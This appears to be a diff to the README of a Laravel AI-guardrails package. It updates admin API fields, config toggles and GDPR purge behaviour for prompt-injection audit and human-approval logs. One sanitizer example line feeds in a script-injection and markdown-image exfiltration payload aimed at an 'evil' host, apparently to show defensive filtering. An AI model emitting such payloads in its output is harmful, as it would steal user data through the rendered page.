@@ -164,7 +164,7 @@ php artisan ai-guardrails:sanitize "<script>steal()</script> ![x](http://evil/le
 # List recent injection-audit attempts (blocked and allowed)
 php artisan ai-guardrails:audit --limit=50
 
-# Apply the GDPR retention strategy to the audit table (actor-audited; the only sanctioned erasure path)
+# Apply the GDPR retention strategy to the audit table AND the HITL sidecar (actor-audited)
 php artisan ai-guardrails:purge --strategy=anonymize --days=365 --actor="ops:nightly"
 php artisan ai-guardrails:purge --dry-run   # report what would be affected, change nothing
 ```
@@ -177,17 +177,17 @@ A read/config HTTP API for an admin panel (e.g. `laravel-ai-guardrails-admin`). 
 
 | Method | Path | Route name | `schema` | Backing store / toggle |
 |---|---|---|---|---|
-| GET | `/overview` | `…overview` | `…v1.overview` | aggregates each control's `enabled` + effective `mode` (enforce/monitor/off) + 24h injection counts + the active `ruleset_version` |
+| GET | `/overview` | `…overview` | `…v1.overview` | aggregates each control's `enabled` + effective `mode` (enforce/monitor/off) + 24h injection counts + the active `ruleset_version`; **v1.1.0 adds** `controls[].posture`, `controls[].spark[12]`, `totals.observed_24h`, `totals.pending_approvals` |
 | GET | `/audit` | `…audit.index` | `…v1.audit-list` | `audit.store` (null \| array \| database) — keyset paginated (`cursor`), filters `blocked`/`rule_id`/`principal_id`/`q`/`from`/`to` |
 | GET | `/audit/{id}` | `…audit.show` | `…v1.audit-detail` | full prompt + `matched_span`; 404 on unknown/non-numeric id |
-| GET | `/audit/trend` | `…audit.trend` | `…v1.audit-trend` | per-UTC-day SQL `GROUP BY` (dialect-safe); 30-day default window |
+| GET | `/audit/trend` | `…audit.trend` | `…v1.audit-trend` | per-UTC-day SQL `GROUP BY` (dialect-safe); 30-day default window; **v1.1.0 adds** `points[].observed` bucket (invariant: `total === blocked + observed + allowed`) |
 | GET | `/firewall` | `…firewall.index` | `…v1.firewall` | `firewall_log.store` — Control A rejections, keyset paginated |
-| GET | `/output/stats` | `…output.stats` | `…v1.output-stats` | `output_stats.store` — per-kind counts, 30-day default window |
-| GET | `/approvals` | `…approvals.index` | `…v1.approval-list` | Control D pending approvals (via `laravel-flow`); empty when HITL unavailable |
+| GET | `/output/stats` | `…output.stats` | `…v1.output-stats` | `output_stats.store` — per-kind counts, 30-day default window; **v1.1.0 adds** `counts.pii.by_detector` |
+| GET | `/approvals` | `…approvals.index` | `…v1.approval-list` | Control D pending approvals (via `laravel-flow`); empty when HITL unavailable; **v1.1.0 adds** `tool`, `arguments`, `requested_ago`, `expires_in` enrichment from the HITL request sidecar |
 | POST | `/approvals/{token}/approve` | `…approvals.approve` | `…v1.approval-decision` | resumes the parked tool; actor principal derived server-side |
 | POST | `/approvals/{token}/reject` | `…approvals.reject` | `…v1.approval-decision` | rejects the parked tool |
 | GET | `/settings` | `…settings.show` | `…v1.settings` | `settings.store` (config \| database) — effective overridable settings |
-| PUT | `/settings` | `…settings.update` | `…v1.settings` | persists allow-listed, type-validated overrides; appends a change record + dispatches `SettingsChanged` |
+| PUT | `/settings` | `…settings.update` | `…v1.settings` | persists allow-listed, type-validated overrides; appends a change record + dispatches `SettingsChanged`; **v1.1.0 widens** the allow-list with all `normalization.*` sub-toggles and `hitl.destructive_tools` |
 | GET | `/settings/changes` | `…settings.changes` | `…v1.settings-changes` | `settings_audit.store` (null \| array \| database) — append-only WHO/WHAT change log |
 | POST | `/try/screen` | `…try.screen` | `…v1.try-screen` | sandbox: screen a prompt (no persistence) |
 | POST | `/try/sanitize` | `…try.sanitize` | `…v1.try-sanitize` | sandbox: sanitize a text blob (no persistence) |
@@ -211,7 +211,8 @@ Every behaviour is a config toggle (`config/ai-guardrails.php`). The four contro
 | `hitl.enabled` | `false` | Enable the HITL approval bridge (needs `laravel-flow`). |
 | `hitl.destructive_tools` | `refund, delete, send_email` | Tool names treated as destructive. |
 | `hitl.fallback` | `deny` | When approval is unavailable: `deny` (refuse) or `pass` (execute). |
-| `audit.store` | `'null'` | `'null'` \| `'array'` \| `'database'` (string tokens). |
+| `audit.store` | `'null'` | `'null'` \| `'array'` \| `'database'` (string tokens). Swept by `ai-guardrails:purge`. |
+| `hitl_requests.store` | `'null'` | `'null'` \| `'array'` \| `'database'`. Append-only HITL request sidecar (tool + scoped arguments at park-time); consumed by `GET /approvals`. Swept by `ai-guardrails:purge` (v1.1.0). |
 | `tool_authorization.enabled` | `false` | Gate tool use behind a Laravel `Gate` ability (fail-closed) — separate from owner-key re-scoping. |
 | `tool_authorization.ability` | `ai-guardrails:use-tool` | The Gate ability checked (with the tool class) before a guarded tool runs. |
 | `tool_authorization.owner_key_depth` | `top_level` | `recursive` re-scopes owner keys at any nesting depth; `top_level` only at the top. |
@@ -274,7 +275,12 @@ The audit is the product value of Control B. Every screening attempt — blocked
 
 **Data hygiene (`audit_hygiene.prompt_storage`).** Because the table captures raw prompts, the stored prompt is transformed before persistence: `redact` (default — composes `laravel-pii-redactor`), `hash` (`sha256:…`, correlate without keeping content), `truncate` (first `truncate_at` code points), or `raw`. Hygiene is applied at the store boundary so every write path is covered; domain events still carry the raw prompt in-process.
 
-**Retention / erasure (`retention.strategy`).** GDPR erasure on an append-only table goes through the sanctioned, actor-audited `ai-guardrails:purge` command — the **only** place rows leave the table. `anonymize` nulls the prompt + principal of rows older than `retention.days`, `purge` hard-deletes them, `keep` retains. Every run logs the actor, strategy, cutoff, and affected-row count.
+**Retention / erasure (`retention.strategy`).** GDPR erasure on the append-only tables goes through the sanctioned, actor-audited `ai-guardrails:purge` command — the **only** place rows leave either table. The command sweeps every store that is on `database` in a single run:
+
+- **Injection audit** (`audit.store=database`): `anonymize` nulls the `prompt` + `principal_id`; `purge` hard-deletes.
+- **HITL request sidecar** (`hitl_requests.store=database`, v1.1.0): `anonymize` redacts `arguments` to `{}` and nulls `principal_id` while keeping `tool`, `run_id`, `occurred_at` (the approval trail survives, PII is gone); `purge` hard-deletes. **Raw arguments are stored by design** — approvers must see exactly what will execute; the purge command is the GDPR answer.
+
+`keep` retains indefinitely. Every run logs the actor, strategy, cutoff, and affected-row count per table.
 
 ## Domain events
 
